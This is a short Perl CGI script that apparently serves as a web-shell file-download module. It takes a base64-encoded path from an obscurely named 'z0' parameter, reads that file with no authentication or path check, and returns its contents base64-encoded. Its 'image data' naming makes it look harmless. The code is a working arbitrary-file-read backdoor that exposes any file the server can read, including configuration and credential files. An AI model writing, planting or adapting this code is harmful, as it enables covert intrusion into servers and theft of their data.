use strict;
use warnings;
use CGI;
use MIME::Base64;

sub main {
    my $q = CGI->new;
    my $z0 = $q->param('z0') // '';

    my $sz_file_path = decode_base64($z0);

    my $ab_image_data = '';
    
    if (open(my $fh, '<', $sz_file_path)) {
        binmode($fh);
        
        local $/;
        $ab_image_data = <$fh>;
        
        close($fh);
    } else {
        return 'ERROR://Unable to open file.';
    }

   
    return encode_base64($ab_image_data, '');
}

print main();